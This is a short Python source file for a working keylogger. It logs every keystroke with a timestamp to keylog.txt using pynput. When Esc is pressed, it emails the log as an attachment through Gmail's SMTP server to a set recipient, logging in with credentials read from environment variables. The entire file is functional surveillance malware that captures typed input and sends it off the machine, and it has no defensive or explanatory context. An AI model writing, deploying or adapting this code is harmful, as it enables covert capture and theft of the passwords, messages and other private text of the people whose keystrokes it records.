import os
from dotenv import load_dotenv
load_dotenv()
from pynput.keyboard import Key
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Listener
import datetime

log_file = "keylog.txt"
recipient_email = "recipient_email@gmail.com"

def send_email(subject, body, attachment_filename):
    email_address = os.environ.get('EMAIL_ADDRESS')
    email_password = os.environ.get('EMAIL_PASSWORD')

    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = recipient_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    with open(attachment_filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
    
    encoders.encode_base64(part)
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {attachment_filename}",
    )

    msg.attach(part)

    # Connect to the SMTP server
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()

        try:
            # Login to the SMTP server
            server.login(email_address, email_password)

            # Send the email
            server.sendmail(email_address, recipient_email, msg.as_string())
            print("Email sent successfully!")
        except smtplib.SMTPAuthenticationError as e:
            print("SMTP Authentication Error:", e)

def on_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(f"{datetime.datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(log_file, 'a') as f:
            f.write(f"{datetime.datetime.now()} - {key}\n")

def on_release(key):
    if key == Key.esc:  
        send_email("Keylogger Data", "Please find attached the log file.", log_file)
        return False

# Start listening to the keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
